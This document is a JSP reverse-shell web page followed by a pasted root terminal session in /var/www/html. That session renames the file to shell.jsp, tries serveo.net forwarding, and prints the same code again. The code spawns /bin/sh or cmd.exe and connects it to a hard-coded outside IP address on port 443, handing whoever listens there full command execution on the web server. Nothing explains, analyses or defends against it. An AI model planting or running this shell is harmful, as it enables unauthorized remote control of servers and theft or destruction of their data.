<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ut;
    OutputStream xb;

    StreamConnector( InputStream ut, OutputStream xb ) 
    {
      this.ut = ut;
      this.xb = xb;
    }

    public void run()
    {
      BufferedReader ft  = null;
      BufferedWriter kij = null;
      try
      {
        ft  = new BufferedReader( new InputStreamReader( this.ut ) );
        kij = new BufferedWriter( new OutputStreamWriter( this.xb ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ft.read( buffer, 0, buffer.length ) ) > 0 )
        {
          kij.write( buffer, 0, length );
          kij.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ft != null )
          ft.close();
        if( kij != null )
          kij.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "45.35.190.24", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
root@archet1pe /var/www/html# server 
Forwarding HTTP traffic from https://home.serveo.net 
Press g to start a GUI session and ctrl-c to quit.

Connection to serveo.net closed by remote host.
Connection to serveo.net closed.
root@archet1pe /var/www/html# mv mtp.jsp shell.jsp 
root@archet1pe /var/www/html# server 
Forwarding HTTP traffic from https://home.serveo.net 
Press g to start a GUI session and ctrl-c to quit.

Connection to serveo.net closed by remote host.
Connection to serveo.net closed.
root@archet1pe /var/www/html# cat shell.jsp 
<%@page import="java.lang.*"%> 
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ut;
    OutputStream xb;

    StreamConnector( InputStream ut, OutputStream xb )
    {
      this.ut = ut;
      this.xb = xb;
    }

    public void run()
    {
      BufferedReader ft  = null;
      BufferedWriter kij = null;
      try
      {
        ft  = new BufferedReader( new InputStreamReader( this.ut ) );
        kij = new BufferedWriter( new OutputStreamWriter( this.xb ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ft.read( buffer, 0, buffer.length ) ) > 0 )
        {
          kij.write( buffer, 0, length );
          kij.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ft != null )
          ft.close();
        if( kij != null )
          kij.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "45.35.190.24", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
